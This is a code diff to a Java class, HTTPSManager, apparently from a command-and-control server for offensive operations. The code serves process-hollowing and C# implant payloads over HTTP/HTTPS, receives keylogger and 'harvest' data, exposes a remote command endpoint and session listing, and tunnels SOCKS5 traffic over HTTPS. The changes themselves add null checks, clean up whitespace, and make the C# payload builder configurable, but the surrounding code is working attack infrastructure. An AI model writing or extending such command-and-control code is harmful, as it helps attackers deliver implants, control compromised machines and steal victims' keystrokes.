@@ -62,7 +62,7 @@ public class HTTPSManager extends C2Interface {
 	private HarvestProcessor harvester;
 
 	private CountDownLatch startLatch = new CountDownLatch(1);
-	
+
 	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keyProcessor, HarvestProcessor harvester) {
 		this.properties = prop;
 		this.port = Integer.parseInt(properties.getProperty(Constants.DAEMONPORT));
@@ -75,7 +75,9 @@ public class HTTPSManager extends C2Interface {
 	public void stop() {
 		httpsServer.stop(1);
 		httpServer.stop(1);
-		keylogHandler.stop();
+		if (keylogHandler != null) {
+			keylogHandler.stop();
+		}
 	}
 
 	@Override
@@ -160,12 +162,24 @@ public class HTTPSManager extends C2Interface {
 					new PayloadHandler(hexPayload));
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTHOLLOWERPAYLOAD),
 					new PayloadHandler(hexPayload));
+			
+			/*
 			String cSharpDirectory = properties.getProperty(Constants.DAEMONPAYLOADCSHARPDIR);
 			if (cSharpDirectory != null) {
 				String cSharpPayload = CSharpPayloadBuilder.buildPayload(cSharpDirectory);
 				httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCSHARPPAYLOAD),
 						new PayloadHandler(cSharpPayload));
-			}
+			} else {
+			*/
+				String importFile = properties.getProperty(Constants.DAEMONPAYLOADCSHARPMASTERIMPORT);
+				String fileList = properties.getProperty(Constants.DAEMONPAYLOADCSHARPFILELIST);
+				if (importFile != null) {
+					String cSharpPayload = CSharpPayloadBuilder.buildConfigurablePayload(Paths.get(importFile),
+							fileList);
+					httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCSHARPPAYLOAD),
+							new PayloadHandler(cSharpPayload));
+				}
+			//}
 
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCMDREST), new CommandHandler(io));
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTGETSESSIONS),
@@ -178,7 +192,7 @@ public class HTTPSManager extends C2Interface {
 			SocksOverHTTPSHandler socksHandler = new SocksOverHTTPSHandler(io);
 			httpsServer.createContext("/socks5", socksHandler);
 			httpServer.createContext("/socks5", socksHandler);
-			
+
 			httpsServer.setExecutor(null); // creates a default executor
 			System.out.println("HTTPS online: " + port);
 			httpsServer.start();
@@ -186,7 +200,7 @@ public class HTTPSManager extends C2Interface {
 			httpServer.setExecutor(null); // creates a default executor
 			System.out.println("HTTP online: " + http_port);
 			httpServer.start();
-			
+
 			startLatch.countDown();
 		} catch (Exception exception) {
 			System.out.println("Failed to create HTTPS server on port " + port + " of localhost");
@@ -195,12 +209,12 @@ public class HTTPSManager extends C2Interface {
 		}
 
 	}
-	
+
 	public void awaitStartup() {
 		try {
 			startLatch.await();
 		} catch (InterruptedException e) {
-			
+
 		}
 	}
 
@@ -341,7 +355,9 @@ public class HTTPSManager extends C2Interface {
 	class LoggerHandler implements HttpHandler {
 
 		public void stop() {
-			keyProcessor.stop();
+			if (keyProcessor != null) {
+				keyProcessor.stop();
+			}
 		}
 
 		KeyloggerProcessor keyProcessor;
